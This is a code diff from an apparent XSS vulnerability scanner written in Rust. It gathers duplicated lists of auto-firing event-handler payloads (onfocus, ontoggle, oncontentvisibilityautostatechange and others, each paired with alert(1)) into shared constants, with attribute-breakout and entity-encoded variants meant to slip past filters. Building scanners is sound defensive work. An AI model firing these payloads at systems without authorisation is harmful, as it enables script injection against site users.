@@ -6,6 +6,45 @@ use std::sync::{Mutex, OnceLock};
 
 // Context-specific payload lists
 
+/// Self-firing event-handler fragments (`handler=alert(1)` plus whatever
+/// attribute makes it fire without a user action), carried in attribute
+/// breakouts so a reflection promotes straight to `[V]` via marker DOM
+/// evidence. Shared by every quoted attribute arm of
+/// [`generate_dynamic_payloads_uncached`] and by [`generate_adaptive_payloads`]
+/// so a new auto-firing handler lands in all of them at once — these lists had
+/// four near-identical copies that drift (see the module history). The
+/// attribute-name-slot arm uses [`AUTOFIRING_EVENTS_NAME_SLOT`] instead, which
+/// drops `onmouseover` (a bare `onmouseover` never fires on a static element in
+/// that position).
+pub(crate) const AUTOFIRING_EVENTS: &[&str] = &[
+    "onfocus=alert(1) autofocus",
+    "onmouseover=alert(1)",
+    "onfocus=alert(1) autofocus tabindex=0",
+    "ontoggle=alert(1) popover",
+    "onbeforeinput=alert(1) contenteditable",
+    "onsecuritypolicyviolation=alert(1)",
+    "onformdata=alert(1)",
+    "onslotchange=alert(1)",
+    // Modern (2025 PortSwigger cheat sheet): fires on the initial layout pass of
+    // off-screen content, no interaction needed, in Chrome/Firefox/Safari. The
+    // `style=content-visibility:auto` is what arms it, so it ships as one
+    // fragment. New-technique coverage; see the research notes in `skills/`.
+    "oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto",
+];
+
+/// [`AUTOFIRING_EVENTS`] without `onmouseover`, for the attribute-name-slot
+/// (unquoted / delimiter-unknown) arm where a bare pointer handler cannot fire.
+pub(crate) const AUTOFIRING_EVENTS_NAME_SLOT: &[&str] = &[
+    "onfocus=alert(1) autofocus",
+    "onfocus=alert(1) autofocus tabindex=0",
+    "ontoggle=alert(1) popover",
+    "onbeforeinput=alert(1) contenteditable",
+    "onsecuritypolicyviolation=alert(1)",
+    "onformdata=alert(1)",
+    "onslotchange=alert(1)",
+    "oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto",
+];
+
 static CUSTOM_PAYLOAD_CACHE: OnceLock<Mutex<HashMap<String, Vec<String>>>> = OnceLock::new();
 
 /// Per-context catalog cache. The generated catalog depends only on `context`
@@ -79,17 +118,7 @@ fn generate_dynamic_payloads_uncached(context: &InjectionContext) -> Vec<String>
                     // every prior payload that lacks a marker only yields [R] and
                     // drains the DOM verification budget.
                     let id_marker = crate::scanning::markers::id_marker();
-                    let autotrigger_events = [
-                        "onfocus=alert(1) autofocus",
-                        "onmouseover=alert(1)",
-                        "onfocus=alert(1) autofocus tabindex=0",
-                        "ontoggle=alert(1) popover",
-                        "onbeforeinput=alert(1) contenteditable",
-                        "onsecuritypolicyviolation=alert(1)",
-                        "onformdata=alert(1)",
-                        "onslotchange=alert(1)",
-                    ];
-                    for ev in &autotrigger_events {
+                    for ev in AUTOFIRING_EVENTS {
                         payloads.push(format!("' {} id={} '", ev, id_marker));
                         // HTML Entity version of = inside attribute events
                         let ev_entity = ev.replace("=", "&#61;");
@@ -125,17 +154,7 @@ fn generate_dynamic_payloads_uncached(context: &InjectionContext) -> Vec<String>
                     // Ordered BEFORE `attr_payloads` so the first angle-free payload
                     // sent is marker-carrying — see SingleQuote branch for full rationale.
                     let id_marker = crate::scanning::markers::id_marker();
-                    let autotrigger_events = [
-                        "onfocus=alert(1) autofocus",
-                        "onmouseover=alert(1)",
-                        "onfocus=alert(1) autofocus tabindex=0",
-                        "ontoggle=alert(1) popover",
-                        "onbeforeinput=alert(1) contenteditable",
-                        "onsecuritypolicyviolation=alert(1)",
-                        "onformdata=alert(1)",
-                        "onslotchange=alert(1)",
-                    ];
-                    for ev in &autotrigger_events {
+                    for ev in AUTOFIRING_EVENTS {
                         payloads.push(format!("\" {} id={} \"", ev, id_marker));
                         // HTML Entity version of = inside attribute events
                         let ev_entity = ev.replace("=", "&#61;");
@@ -171,16 +190,7 @@ fn generate_dynamic_payloads_uncached(context: &InjectionContext) -> Vec<String>
                     // Listed BEFORE attr_payloads so the first marker-
                     // carrying payload is also DOM-verifiable.
                     let id_marker = crate::scanning::markers::id_marker();
-                    let autotrigger_events = [
-                        "onfocus=alert(1) autofocus",
-                        "onfocus=alert(1) autofocus tabindex=0",
-                        "ontoggle=alert(1) popover",
-                        "onbeforeinput=alert(1) contenteditable",
-                        "onsecuritypolicyviolation=alert(1)",
-                        "onformdata=alert(1)",
-                        "onslotchange=alert(1)",
-                    ];
-                    for ev in &autotrigger_events {
+                    for ev in AUTOFIRING_EVENTS_NAME_SLOT {
                         payloads.push(format!("{} id={}", ev, id_marker));
                         let ev_entity = ev.replace("=", "&#61;");
                         payloads.push(format!("{} id={}", ev_entity, id_marker));
@@ -356,16 +366,6 @@ pub(crate) fn generate_adaptive_payloads(
         );
         if add_attr_payloads {
             let id_marker = crate::scanning::markers::id_marker();
-            let events = [
-                "onfocus=alert(1) autofocus",
-                "onmouseover=alert(1)",
-                "onfocus=alert(1) autofocus tabindex=0",
-                "ontoggle=alert(1) popover",
-                "onbeforeinput=alert(1) contenteditable",
-                "onsecuritypolicyviolation=alert(1)",
-                "onformdata=alert(1)",
-                "onslotchange=alert(1)",
-            ];
             let delimiter = match context {
                 InjectionContext::Attribute(d) | InjectionContext::AttributeUrl(d) => d.clone(),
                 _ => None,
@@ -374,7 +374,7 @@ pub(crate) fn generate_adaptive_payloads(
                 Some(DelimiterType::SingleQuote) => ("'", "'"),
                 _ => ("\"", "\""),
             };
-            for ev in &events {
+            for ev in AUTOFIRING_EVENTS {
                 filtered_payloads.push(format!("{} {} id={} {}", open_q, ev, id_marker, close_q));
                 // Tab separator variant for space-filtered contexts
                 filtered_payloads
